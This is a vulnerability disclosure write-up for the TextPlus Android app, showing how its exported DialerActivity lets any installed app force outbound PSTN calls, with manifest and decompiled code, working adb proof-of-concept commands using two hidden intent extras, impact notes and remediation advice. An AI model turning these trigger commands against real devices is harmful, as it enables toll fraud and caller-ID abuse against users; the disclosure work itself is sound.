# TextPlus (com.gogii.textplus) - Unauthorized Outbound Call via Exported DialerActivity

Zero-permission forced call origination in the TextPlus Android app. Any installed
application can cause TextPlus to place an arbitrary outbound PSTN call without
user interaction and without holding any Android permission, by starting an
exported activity with two string extras.

<img width="1881" height="997" alt="image" src="https://github.com/actuator/com.gogii.textplus/blob/main/com.gogii.textplus-PHONE-8.3.5-poc.gif" />

| | |
|---|---|
| Package | `com.gogii.textplus` |
| Tested version | 8.3.5 (versionCode 83501441) |
| minSdk / targetSdk | 24 / 35 |
| Component | `com.nextplus.android.activity.DialerActivity` (exported) |
| Class | CWE-926 (improper export of Android component) / CWE-862 (missing authorization) |
| Caller permissions required | none |
| User interaction | none |

## Summary

`DialerActivity` is exported with no permission guard. It forwards the incoming
intent's extras into the `DialerFragment` arguments bundle. `DialerFragment.onCreate`
contains an auto-dial branch that originates a call when the arguments carry both
`INTENT_ADDRESS_TO_CALL` and `INTENT_DISPLAY_STRING` and no `PHONE_NUMBER` key.
A non-JID address routes to `CallAddressType.PSTN` and reaches the call stack
without any further user action.

## Root cause

Manifest - the only exported call surface, no `android:permission`:

```xml
<activity
    android:name="com.nextplus.android.activity.DialerActivity"
    android:exported="true"
    android:screenOrientation="1"
    ...>
    <intent-filter>
        <action android:name="android.phone.extra.NEW_CALL_INTENT"/>
        <action android:name="android.intent.action.CALL"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <data android:scheme="tel"/>
        <data android:scheme="sip"/>
        <data android:scheme="sips"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.SENDTO"/>
        <action android:name="android.intent.action.VIEW"/>
        <action android:name="android.intent.action.DIAL"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <data android:scheme="sip"/>
        <data android:scheme="sips"/>
        <data android:scheme="imto"/>
        <data android:scheme="tel"/>
    </intent-filter>
</activity>
```

`InCallActivity`, `CallingServiceImpl` and the rest of the origination path are
**not** exported, so `DialerActivity` is the entire external attack surface.

Decompiled `DialerFragment.onCreate` (deobfuscated, reformatted):

```java
public void onCreate(Bundle b) {
    super.onCreate(b);
    ...
    if (getArguments() == null || !getArguments().containsKey("PHONE_NUMBER")) {
        if (getArguments() != null
                && getArguments().containsKey("com.nextplus.android.fragment.INTENT_ADDRESS_TO_CALL")
                && getArguments().containsKey("com.nextplus.android.fragment.INTENT_DISPLAY_STRING")) {

            String addr    = getArguments().getString("com.nextplus.android.fragment.INTENT_ADDRESS_TO_CALL");
            String display = getArguments().getString("com.nextplus.android.fragment.INTENT_DISPLAY_STRING");
            ...
            if (addr != null && !addr.isEmpty()) {
                if (!JidUtil.isJid(addr) || JidUtil.getJidType(addr) != 0) {
                    CallingService.CallAddressType type =
                        JidUtil.isJid(addr) ? CallAddressType.JID : CallAddressType.PSTN;
                    makeCallWithPermissions(addr, type, display);   // <-- auto-dial
                } else {
                    makeCallWithPermissions(addr, CallAddressType.JID, display);
                }
            }
        }
    } else {
        this.deeplinkPhoneNumber = getArguments().getString("PHONE_NUMBER");  // prefill only
    }
    ...
}
```

Call chain on the auto-dial branch:

```
DialerActivity (intent extras -> fragment arguments)
  -> DialerFragment.onCreate
    -> DialerFragment.makeCallWithPermissions(addr, PSTN, display)
      -> CallingServiceImpl.makeCall(...)
        -> LinphoneCallStack.makeCall(...)        // SIP/PSTN origination
```

The factory that sets these exact keys is `DialerFragment.newInstanceWithInstantCall(addr, display)`:

```java
public static DialerFragment newInstanceWithInstantCall(String addr, String display) {
    DialerFragment f = new DialerFragment();
    Bundle b = new Bundle();
    b.putString("com.nextplus.android.fragment.INTENT_ADDRESS_TO_CALL", addr);
    b.putString("com.nextplus.android.fragment.INTENT_DISPLAY_STRING", display);
    f.setArguments(b);
    return f;
}
```

Notes:
- The class is wrapped by a runtime reflection layer (`androidx.savedstate.internal.fG.*`
  holding `java.lang.reflect.Method` fields). Static cross-references to the
  factory and the keys are therefore empty; reachability was confirmed
  dynamically (see Reproduction).
- A `tel:` data URI alone routes through the `PHONE_NUMBER` branch and only
  prefills the dialpad. Omitting `PHONE_NUMBER` and supplying the two
  instant-call extras is what reaches `makeCallWithPermissions`.

## Discovery - why the default scanner PoC was not sufficient

The component was surfaced by `pSlip`, a static export-surface scanner. `pSlip`
parses the manifest, flags `DialerActivity` as `exported=true` with no
`android:permission` and an intent-filter carrying `action.CALL`/`DIAL` plus
`tel:`/`sip:` data, and emits a templated `am start` from those filter
attributes. The generated command is, in effect:

```bash
adb shell am start -a android.intent.action.CALL -d tel:<number> \
  -n com.gogii.textplus/com.nextplus.android.activity.DialerActivity
```

That command launches the activity and only prefills the dialpad. It does not
place a call. The generator is manifest-faithful, and that is exactly the limit:

- The auto-dial trigger is two fragment-argument extras,
  `INTENT_ADDRESS_TO_CALL` and `INTENT_DISPLAY_STRING`, read via `getArguments()`
  inside `DialerFragment.onCreate`. Those keys are declared nowhere in the
  manifest - they are dex-resident. A manifest-driven generator has no way to
  synthesize them.
- The one input the generator can derive from the filter, the `tel:` data URI,
  routes through the `PHONE_NUMBER` branch, which is prefill-only. The declared
  `tel:` surface is effectively a decoy; the dangerous path is reached by extras
  the filter never mentions.
- The class is wrapped by a reflection layer, so static cross-references from the
  extras keys to the `makeCall` sink are empty. Even locating the gate and the
  sink was manual decompilation, not something a key-to-sink taint pass would
  have recovered cleanly here.

So `pSlip` did its job - it found the unprotected, call-capable component and
produced the lead. Turning that lead into a working PoC required dex-level
review: decompiling `DialerFragment.onCreate`, identifying the
`makeCallWithPermissions` sink and the two gate keys, and recognizing that the
manifest-declared `tel:` route is the safe branch. Export-surface enumeration
finds the door; the actual key is in the bytecode.

## Reproduction

### adb

Use a destination you control. The PSTN path consumes account credits.

Extras only (explicit component bypasses intent-filter matching):

```bash
adb shell am start -n com.gogii.textplus/com.nextplus.android.activity.DialerActivity \
  --es "com.nextplus.android.fragment.INTENT_ADDRESS_TO_CALL" "+15055034455" \
  --es "com.nextplus.android.fragment.INTENT_DISPLAY_STRING" "poc"
```

With `action CALL` (behaves identically - explicit component, app-interpreted action,
not the system Telecom CALL, so no sender permission is involved):

```bash
adb shell am start -a android.intent.action.CALL \
  -n com.gogii.textplus/com.nextplus.android.activity.DialerActivity \
  --es "com.nextplus.android.fragment.INTENT_ADDRESS_TO_CALL" "+15055034455" \
  --es "com.nextplus.android.fragment.INTENT_DISPLAY_STRING" "poc"
```

Observe origination:

```bash
adb logcat -c && adb logcat | grep -iE "makeCall|LinphoneCallStack|CallingServiceImpl"
```

Both variants reach the call stack and place the call.


## Impact

- Any installed app, with no permissions and no user interaction, can drive
  TextPlus into placing outbound PSTN calls.
- Calls are billed against the victim's TextPlus credits/account.
- Outbound calls present the victim's TextPlus number as caller ID, enabling
  attacker-chosen caller-ID presentation through the victim's identity.
- A malicious or compromised app could place calls silently (for example to a
  premium-rate or attacker-controlled number) for toll abuse or to harvest the
  victim's number via the inbound leg.

Severity depends on whether the call completes past the credits check; verify
billing and caller-ID presentation against a controlled destination before
finalizing a CVSS score.

## Suggested remediation

- Do not auto-originate calls from intent-supplied data. Require an explicit
  in-app user action (the dialpad call button) before reaching
  `makeCallWithPermissions`.
- Set `android:exported="false"` on `DialerActivity`, or gate it behind a
  signature-level permission, if external launch is not a product requirement.
- If external `tel:`/`sip:` deep links must be supported, treat them as prefill
  only and never as instant-call; do not forward arbitrary intent extras into
  fragment arguments.

## Credit

Edward "Actuator" Warren - https://actuator.sh
